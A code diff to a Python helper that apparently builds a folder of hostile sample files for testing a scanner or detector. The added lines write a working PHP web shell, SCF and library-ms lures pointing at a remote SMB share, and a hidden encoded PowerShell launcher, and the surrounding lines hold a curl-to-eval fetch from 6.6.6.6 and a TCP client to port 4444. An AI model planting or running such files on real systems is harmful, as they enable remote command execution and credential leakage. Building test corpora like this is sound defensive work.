@@ -251,6 +251,12 @@ def build_folder(root):
     w("smuggle.xhtml", b"<?xml version=\"1.0\"?><html xmlns=\"http://www.w3.org/1999/xhtml\">"
                         b"<script>var d=atob('dGVzdA==');var b=new Blob([d]);"
                         b"a.href=URL.createObjectURL(b);a.click();</script></html>")
+    w("shell.php", b"<?php\n@eval($_POST['cmd']);\nsystem($_GET['c']);\n?>\n")
+    w("leak.scf", b"[Shell]\nCommand=2\nIconFile=\\\\1.2.3.4\\share\\x.ico\n")
+    w("evil.settingcontent-ms", b'<?xml version="1.0"?><StoreManifest><Arguments>powershell -windowstyle hidden -enc AAAA</Arguments></StoreManifest>')
+    w("lure.library-ms", b'<?xml version="1.0"?><libraryDescription><searchConnectorDescription>'
+                          b'<simpleLocation><url>file://\\\\1.2.3.4\\share</url></simpleLocation>'
+                          b'</searchConnectorDescription></libraryDescription>')
     w("pipe.sh", b"eval \"$(curl -fsSL http://6.6.6.6/x.sh)\"\n")
     w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
                         b"$s = $c.GetStream()\n")
